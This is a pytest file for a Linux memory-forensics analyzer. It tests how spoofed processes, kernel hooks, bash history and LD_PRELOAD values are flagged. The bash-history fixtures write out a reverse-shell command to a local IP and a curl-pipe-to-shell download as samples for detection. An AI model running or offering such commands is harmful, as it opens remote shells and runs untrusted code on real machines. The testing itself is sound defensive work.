"""Tests for the vol3 2.28 migration: behavioral adjudication of
linux.malware.process_spoofing, and the ftrace/tracepoint anomaly handlers.

These verify the FP-calibration proven against the live ubuntu-main image: raw
Comm_Spoofed / Cmdline_Spoofed flags (benign on a clean host) are NOT emitted,
while Exe_Deleted and kernel-thread masquerade ARE.
"""
import sys
from conftest import LINUX_HUNT

sys.path.insert(0, LINUX_HUNT)
import analyze_memory_linux as m  # noqa: E402


def types(findings):
    return {f["Type"] for f in findings}


# --- process_spoofing: behavioral adjudication --------------------------------

def test_benign_comm_spoof_not_flagged():
    """A python daemon (comm != exe basename) is benign and must NOT be flagged -
    this is the 23-FP case from the live image."""
    rows = [
        {"PID": 1825, "Comm": "networkd-dispat", "Exe_Path": "/usr/bin/python3.13",
         "Comm_Spoofed": True, "Cmdline_Spoofed": True, "Exe_Deleted": False},
        {"PID": 1, "Comm": "systemd", "Exe_Path": "/usr/lib/systemd/systemd",
         "Comm_Spoofed": False, "Cmdline_Spoofed": True, "Exe_Deleted": False},
    ]
    assert m.analyze_process_spoofing(rows) == []


def test_deleted_exe_flagged_high():
    rows = [{"PID": 4444, "Comm": "nginx", "Exe_Path": "/tmp/x",
             "Comm_Spoofed": False, "Cmdline_Spoofed": False, "Exe_Deleted": True}]
    out = m.analyze_process_spoofing(rows)
    assert "Process Running Deleted Binary (memory)" in types(out)
    assert out[0]["Severity"] == "High"


def test_kernel_thread_masquerade_flagged_high():
    """comm presents as a kernel thread but has a userland exe -> masquerade."""
    rows = [{"PID": 31337, "Comm": "kworker/0:2", "Exe_Path": "/dev/shm/implant",
             "Comm_Spoofed": True, "Cmdline_Spoofed": False, "Exe_Deleted": False}]
    out = m.analyze_process_spoofing(rows)
    assert "Kernel-Thread Name Masquerade (memory)" in types(out)
    assert out[0]["Severity"] == "High"


def test_spoof_from_implant_dir_flagged():
    rows = [{"PID": 2222, "Comm": "evil", "Exe_Path": "/var/tmp/dropper",
             "Comm_Spoofed": True, "Cmdline_Spoofed": False, "Exe_Deleted": False}]
    out = m.analyze_process_spoofing(rows)
    assert "Spoofed Process From Implant Dir (memory)" in types(out)


def test_real_kthread_not_flagged():
    """An actual kernel thread (no exe) is not a masquerade."""
    rows = [{"PID": 2, "Comm": "kthreadd", "Exe_Path": "N/A",
             "Comm_Spoofed": False, "Cmdline_Spoofed": False, "Exe_Deleted": False}]
    assert m.analyze_process_spoofing(rows) == []


# --- ftrace / tracepoints: anomaly-only passthrough ---------------------------

def test_ftrace_hook_row_flagged():
    rows = [{"Address": 0xffff1234, "Callback Symbol": "UNKNOWN", "Module": "-"}]
    out = m.analyze_ftrace(rows)
    assert "Ftrace Kernel Hook (memory)" in types(out)
    assert out[0]["Severity"] == "High"


def test_tracepoint_hook_row_flagged():
    rows = [{"Tracepoint": "sys_enter_getdents64", "Callback Symbol": "UNKNOWN"}]
    out = m.analyze_tracepoints(rows)
    assert "Tracepoint/Kprobe Hook (memory)" in types(out)


def test_ftrace_clean_no_rows():
    assert m.analyze_ftrace([]) == []
    assert m.analyze_tracepoints(None) == []


# --- analyze_bash: structure, not bare /tmp references ------------------------

def test_bash_benign_tmp_references_not_flagged():
    """The exact FP set from the ubuntu-main run: bare /tmp references are benign."""
    rows = [{"Command": c, "PID": 72987} for c in
            ("ls /tmp/claude-1000/", "cd /tmp/", "cat /tmp/test_run_phase4_zero3.txt",
             "rm -rf /tmp/claude-1000/", "tail -f /tmp/k8s_run.log")]
    assert m.analyze_bash(rows) == []


def test_bash_real_attacks_flagged_high():
    for cmd in ("bash -i >& /dev/tcp/10.0.0.5/4444 0>&1", "curl http://x/a.sh | sh"):
        out = m.analyze_bash([{"Command": cmd, "PID": 9}])
        assert out and out[0]["Severity"] == "High", cmd


def test_bash_implant_exec_is_medium():
    out = m.analyze_bash([{"Command": "/tmp/payload", "PID": 9}])
    assert out and out[0]["Severity"] == "Medium"


def test_bash_sudo_su_is_medium_not_high():
    """`sudo su` is privilege escalation but routine admin - Medium, not a scary High."""
    out = m.analyze_bash([{"Command": "sudo su", "PID": 9}])
    assert out and out[0]["Severity"] == "Medium"


# --- analyze_envars: LD_PRELOAD provenance, not blanket High ------------------

def test_envars_benign_soname_is_low():
    """LD_PRELOAD=libmozsandbox.so (Firefox sandbox) is benign - Low, not High."""
    out = m.analyze_envars([{"KEY": "LD_PRELOAD", "VALUE": "libmozsandbox.so",
                             "PID": 4751, "COMM": "forkserver"}])
    assert out and out[0]["Severity"] == "Low"


def test_envars_writable_preload_is_high():
    out = m.analyze_envars([{"KEY": "LD_PRELOAD", "VALUE": "/tmp/evil.so",
                             "PID": 9, "COMM": "sshd"}])
    assert out and out[0]["Severity"] == "High"
    assert out[0]["Type"] == "Linker Hijack (memory)"
